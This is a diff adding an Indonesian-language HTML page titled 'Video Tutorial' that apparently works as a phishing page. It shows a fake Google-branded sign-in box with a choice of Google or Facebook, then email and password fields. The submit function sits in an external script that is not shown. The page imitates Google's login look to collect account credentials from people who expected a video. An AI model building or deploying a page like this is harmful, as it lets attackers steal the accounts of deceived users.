@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Tutorial</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Roboto', Arial, sans-serif;
+            cursor: pointer;
+
+            background-image: url("indomaret.jpg");
+            background-color: #0b1020;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== JENDELA — MIRIP GOOGLE ===== */
+        .box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.95);
+            z-index: 10;
+
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 32px 28px;
+
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+
+            text-align: center;
+            color: #202124;
+
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.25s ease;
+        }
+
+        .box.show {
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        /* Tombol tutup (X) */
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            font-size: 22px;
+            color: #5f6368;
+            cursor: pointer;
+            font-weight: 400;
+            line-height: 1;
+            transition: color 0.2s;
+            z-index: 3;
+        }
+
+        .close-btn:hover {
+            color: #202124;
+        }
+
+        /* Logo Google */
+        .google-logo {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 12px;
+        }
+
+        .google-logo span:nth-child(1) { color: #4285f4; }
+        .google-logo span:nth-child(2) { color: #ea4335; }
+        .google-logo span:nth-child(3) { color: #fbbc05; }
+        .google-logo span:nth-child(4) { color: #4285f4; }
+        .google-logo span:nth-child(5) { color: #34a853; }
+        .google-logo span:nth-child(6) { color: #ea4335; }
+
+        h2 {
+            margin-bottom: 8px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .subtitle {
+            margin-bottom: 28px;
+            color: #5f6368;
+            font-size: 16px;
+        }
+
+        /* ===== TOMBOL PILIHAN LOGIN ===== */
+        .pilihan-container {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-bottom: 10px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px 20px;
+            border: 1px solid #dadce0;
+            border-radius: 24px;
+            background: #ffffff;
+            color: #202124;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .login-btn:hover {
+            background: #f8f9fa;
+            border-color: #d0d4d9;
+        }
+
+        .login-btn .logo {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .google-g {
+            background: linear-gradient(90deg, #4285f4 0%, #4285f4 25%, #34a853 25%, #34a853 50%, #fbbc05 50%, #fbbc05 75%, #ea4335 75%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .facebook-f {
+            color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dadce0;
+        }
+
+        .divider span {
+            padding: 0 16px;
+            color: #80868b;
+            font-size: 14px;
+        }
+
+        /* ===== FORM INPUT ===== */
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+
+        .input-label {
+            position: absolute;
+            top: 16px;
+            left: 14px;
+            font-size: 16px;
+            color: #80868b;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background: #ffffff;
+            padding: 0 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 20px 14px 8px;
+            margin-bottom: 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #202124;
+            outline: none;
+            font-size: 16px;
+            height: 56px;
+            transition: border 0.2s;
+        }
+
+        input::placeholder {
+            color: transparent;
+        }
+
+        input:focus {
+            border-color: #4285f4;
+            border-width: 2px;
+        }
+
+        input:focus + .input-label,
+        input:not(:placeholder-shown) + .input-label {
+            top: 8px;
+            left: 12px;
+            font-size: 12px;
+            color: #4285f4;
+        }
+
+        .help-link {
+            text-align: left;
+            margin: 4px 0 20px;
+        }
+
+        .help-link a {
+            color: #4285f4;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .help-link a:hover {
+            text-decoration: underline;
+        }
+
+        .guest-note {
+            text-align: left;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+
+        .guest-note a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .guest-note a:hover {
+            text-decoration: underline;
+        }
+
+        .bottom-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-link a {
+            color: #4285f4;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .create-link a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-next {
+            padding: 10px 28px;
+            border: none;
+            border-radius: 4px;
+            background: #4285f4;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-next:hover {
+            background: #3367d6;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
+        }
+
+        #loading {
+            display: none;
+            margin-top: 16px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        #error {
+            display: none;
+            margin-top: 16px;
+            color: #d93025;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .box {
+                padding: 32px 20px 24px;
+                border-radius: 24px;
+            }
+            h2 { font-size: 20px; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- PETUNJUK KLIK LAYAR -->
+    <div id="tapHint" style="position:fixed;z-index:1;color:white;font-size:18px;opacity:0.7;pointer-events:none;animation:pulse 2s infinite;">
+         
+    </div>
+
+    <!-- KOTAK PILIHAN — GOOGLE ATAU FACEBOOK -->
+    <div class="box" id="pilihanBox">
+        <div class="close-btn" onclick="tutupBox(event)">&times;</div>
+
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+
+        <h2>Masuk</h2>
+        <p class="subtitle">Pilih akun untuk melanjutkan</p>
+
+        <div class="pilihan-container">
+            <button class="login-btn" onclick="pilihVideo('google')">
+                <span class="logo google-g">G</span>
+                Lanjutkan dengan Google
+            </button>
+            <button class="login-btn" onclick="/pilihVideo('facebook')">
+                <span class="logo facebook-f">f</span>
+                Lanjutkan dengan Facebook
+            </button>
+        </div>
+
+        <div class="divider">
+            <span>atau</span>
+        </div>
+
+        <p style="font-size:14px;color:#5f6368;margin-top:-8px;">Pilih salah satu akun untuk masuk</p>
+    </div>
+
+
+    <!-- FORM LOGIN -->
+    <div class="box" id="formBox">
+        <div class="close-btn" onclick="tutupBox(event)">&times;</div>
+
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+
+        <h2 id="judulForm">Login</h2>
+        <p class="subtitle" id="subJudul">Gunakan Akun Google Anda</p>
+
+        <div class="input-wrapper">
+            <input
+                type="text"
+                id="nama"
+                placeholder="Email Address"
+                autocomplete="username"
+            >
+            <label class="input-label">Email Address</label>
+        </div>
+
+        <div class="help-link">
+            <a href="#" onclick="return false;">Lupa email?</a>
+        </div>
+
+        <div class="input-wrapper">
+            <input
+                type="password"
+                id="kode"
+                placeholder="Password"
+                autocomplete="current-password"
+            >
+            <label class="input-label">Kata Sandi</label>
+        </div>
+
+        <div class="guest-note">
+            Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="#" onclick="return false;">Pelajari selengkapnya</a>
+        </div>
+
+        <div class="bottom-links">
+            <div class="create-link">
+                <a href="#" onclick="return false;">Buat akun</a>
+            </div>
+            <button class="btn-next" onclick="masuk()">Berikutnya</button>
+        </div>
+
+        <p id="loading">Memeriksa data...</p>
+        <p id="error"></p>
+    </div>
+
+
+    <!-- PANGGIL FILE JS SAJA -->
+    <script src="javas.js"></script>
+
+    <style>
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+    </style>
+
+</body>
+</html>
